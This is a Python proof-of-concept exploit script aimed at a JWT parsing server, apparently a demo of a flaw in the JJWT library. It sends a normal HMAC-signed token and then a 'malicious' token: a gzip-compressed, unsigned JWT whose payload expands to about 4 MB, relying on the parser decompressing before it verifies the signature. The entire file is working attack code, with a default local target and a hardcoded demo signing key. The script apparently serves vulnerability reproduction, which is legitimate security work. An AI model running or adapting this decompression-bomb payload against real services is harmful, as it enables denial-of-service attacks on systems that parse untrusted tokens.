#!/usr/bin/env python3
"""Send benign and compressed unsigned JWTs to the JJWT PoC server."""

import base64
import gzip
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request


SIGNING_KEY = b"cgp-753c-demo-signing-key-32!!"
EXPANDED_MARKER_BYTES = 4 * 1024 * 1024


def base64url(value):
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")


def json_bytes(value):
    return json.dumps(value, separators=(",", ":")).encode("utf-8")


def signed_benign_jwt():
    header = base64url(json_bytes({"alg": "HS256", "typ": "JWT"}))
    payload = base64url(json_bytes({"sub": "alice", "marker": "BENIGN_MARKER"}))
    signing_input = (header + "." + payload).encode("ascii")
    signature = hmac.new(SIGNING_KEY, signing_input, hashlib.sha256).digest()
    return header + "." + payload + "." + base64url(signature)


def compressed_unsigned_jwt():
    header = base64url(json_bytes({"alg": "HS256", "zip": "GZIP"}))
    marker = "CGP-753c-3hg7-j33f" + "A" * EXPANDED_MARKER_BYTES
    payload = gzip.compress(json_bytes({"sub": "mallory", "marker": marker}))

    # The empty signature is intentional: the vulnerable parser decompresses
    # before it reaches signature verification.
    return header + "." + base64url(payload) + "."


def send(label, token, url):
    request = urllib.request.Request(
        url,
        headers={"Authorization": "Bearer " + token},
        method="GET",
    )
    print("=== " + label + " ===")
    print("JWT_BYTES=" + str(len(token)))
    try:
        with urllib.request.urlopen(request) as response:
            print("HTTP_STATUS=" + str(response.status))
            print(response.read().decode("utf-8"), end="")
    except urllib.error.HTTPError as error:
        print("HTTP_STATUS=" + str(error.code))
        print(error.read().decode("utf-8"), end="")


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/parse"
    send("BENIGN SIGNED JWT", signed_benign_jwt(), url)
    send("MALICIOUS COMPRESSED UNSIGNED JWT", compressed_unsigned_jwt(), url)


if __name__ == "__main__":
    main()
